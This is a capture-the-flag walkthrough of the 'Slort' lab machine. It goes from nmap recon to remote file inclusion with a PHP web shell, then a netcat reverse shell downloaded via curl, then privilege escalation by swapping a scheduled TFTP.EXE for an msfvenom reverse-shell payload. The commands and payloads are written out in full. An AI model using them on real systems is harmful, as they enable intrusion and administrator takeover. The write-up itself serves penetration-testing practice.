# **Slort | PG Practice**

- Running an nmap scan we have 

```bash
# Nmap 7.94SVN scan initiated Fri Aug  9 05:39:00 2024 as: nmap -p- -T4 -v --min-rate=1000 -sCV -oN nmap.txt 192.168.220.53
Warning: 192.168.220.53 giving up on port because retransmission cap hit (6).
Nmap scan report for 192.168.220.53
Host is up (0.14s latency).
Not shown: 65015 closed tcp ports (conn-refused), 505 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
| fingerprint-strings: 
|   DNSStatusRequestTCP, FourOhFourRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, NULL, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie: 
|_    Host '192.168.45.228' is not allowed to connect to this MariaDB server
4443/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.220.53:4443/dashboard/
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8080/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.220.53:8080/dashboard/
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
--SNIP--
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
--SNIP--
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-time: 
|   date: 2024-08-09T04:42:55
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Aug  9 05:43:11 2024 -- 1 IP address (1 host up) scanned in 250.80 seconds
```

- No share listing on SMB

```bash
❯ smbclient -L \\\\192.168.220.53\\
Password for [WORKGROUP\sec-fortress]:
session setup failed: NT_STATUS_ACCESS_DENIED
```

- No anonymous access on `FTP`

```bash
❯ ftp 192.168.220.53
Connected to 192.168.220.53.
220-FileZilla Server version 0.9.41 beta
220-written by Tim Kosse (Tim.Kosse@gmx.de)
220 Please visit http://sourceforge.net/projects/filezilla/
Name (192.168.220.53:sec-fortress): anonymous
331 Password required for anonymous
Password: 
530 Login or password incorrect!
ftp: Login failed
ftp> 
```

> Found an exploit for the `FileZilla` version at https://github.com/NeoTheCapt/FilezillaExploit which creates a local user on the system that has full access to the `C:\` directory. We have to probably upload this file somehow on the server and get access it on the web endpoint.

- We don't have access to `MSRPC` also

```bash
❯ rpcclient -U "" -N 192.168.220.53
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
```

- We are not allowed to connect to `MYSQL` on port 3306

```bash
❯ mysql -h 192.168.220.53
ERROR 1130 (HY000): Host '192.168.45.228' is not allowed to connect to this MariaDB server
```

- Performing directory fuzzing with `dirsearch` i found few interesting directories

```bash
❯ dirsearch --url http://192.168.220.53:8080/                                                             
                                                                                                          
  _|. _ _  _  _  _ _|_    v0.4.3                                                                          
 (_||| _) (/_(_|| (_| )            
                                                                                                          
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
                                                                                                          
Output File: /home/sec-fortress/PG/slort/reports/http_192.168.220.53_8080/__24-08-09_05-51-20.txt
                                                                                                          
Target: http://192.168.220.53:8080/                                                                       

[05:51:20] Starting:   

--SNIP--
[05:52:10] 301 -  351B  - /dashboard  ->  http://192.168.220.53:8080/dashboard/                           
[05:52:10] 200 -    6KB - /dashboard/howto.html             
[05:52:10] 200 -    7KB - /dashboard/                
[05:52:10] 200 -   31KB - /dashboard/faq.html                                                             
[05:52:10] 200 -   78KB - /dashboard/phpinfo.php
[05:52:18] 200 -   30KB - /favicon.ico
[05:52:58] 301 -  346B  - /site  ->  http://192.168.220.53:8080/site/
[05:52:58] 301 -   27B  - /site/  ->  index.php?page=main.php
[05:53:15] 200 -  782B  - /Webalizer/
[05:53:17] 200 -  774B  - /xampp/  
```

> Out of which http://192.168.220.53:8080/site/index.php?page=main,php is the most interesting

- I decided to try out RFI on this endpoint first of all by saving the below PHP code into a file and starting up a python server 

```bash
# Save into a .php file
<?=`$_GET[0]`?>

# Start up python server
python3 -m http.server 80
```



- Then access the URL from the web endpoint ;

```http
http://192.168.220.53:8080/site/index.php?page=http://192.168.45.228/rev.php&0=whoami
```

![image](https://github.com/user-attachments/assets/5b43ab1c-20df-49e2-ab22-f8acfcd0933b)

- Now to get reverse shell, i dropped a `nc64.exe` binary to target on the `\users\public` directory which is always world writable

```http
http://192.168.220.53:8080/site/index.php?page=http://192.168.45.228/rev.php&0=curl+http://192.168.45.228/nc64.exe+-o+\users\public\nc64.exe

view-source:http://192.168.220.53:8080/site/index.php?page=http://192.168.45.228/rev.php&0=dir+\users\public\

view-source:http://192.168.220.53:8080/site/index.php?page=http://192.168.45.228/rev.php&0=\users\public\nc64.exe+192.168.45.228+4444+-e+cmd.exe
```



- Now make sure to start up your listener before running the last command above to get your reverse shell

```bash
❯ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.228] from (UNKNOWN) [192.168.220.53] 50171
Microsoft Windows [Version 10.0.19042.1387]
(c) Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\site>whoami
whoami
slort\rupert
```

- Navigating to `C:\` i found a backup directory

```powershell
C:\Backup>dir
 Volume in drive C has no label.
 Volume Serial Number is 6E11-8C59

 Directory of C:\Backup

07/20/2020  07:08 AM    <DIR>          .
07/20/2020  07:08 AM    <DIR>          ..
06/12/2020  07:45 AM            11,304 backup.txt
06/12/2020  07:45 AM                73 info.txt
06/23/2020  07:49 PM            73,802 TFTP.EXE
               3 File(s)         85,179 bytes    
               2 Dir(s)  28,609,777,664 bytes free
```

- Concatenating `info.txt` we have this message;

```powershell
C:\Backup>type info.txt
type info.txt
Run every 5 minutes:
C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt
```

> Meaning '`backup.txt`' runs every 5 minutes by some automated user, if we can replace this binary with our reverse shell binary, maybe we might get shell as that automated user

- First of all i checked if we have write access to the `TFTP.EXE` file and yes we do, cos' we belong to the `BUILTIN\Users` group

```powershell
PS C:\Backup> icacls TFTP.EXE
icacls TFTP.EXE
TFTP.EXE BUILTIN\Users:(I)(F)
         BUILTIN\Administrators:(I)(F)
         NT AUTHORITY\SYSTEM:(I)(F)
         NT AUTHORITY\Authenticated Users:(I)(M)
```

- Now generate a `TFTP.exe` file with `msfvenom` and replace with the current `TFTP.EXE` file

```powershell
❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=444 -f exe > TFTP.exe                                                                                                                                  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes   
Final size of exe file: 7168 bytes
```

```powershell
PS C:\Backup> curl http://192.168.45.228/TFTP.exe -o C:\Backup\TFTP.exe
```

- Then we wait for the magic to happen which indeed gave us the **administrator** user as the automated user

```cmd
❯ rlwrap nc -lvnp 444
listening on [any] 444 ...
connect to [192.168.45.228] from (UNKNOWN) [192.168.220.53] 50719
Microsoft Windows [Version 10.0.19042.1387]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
slort\administrator
```

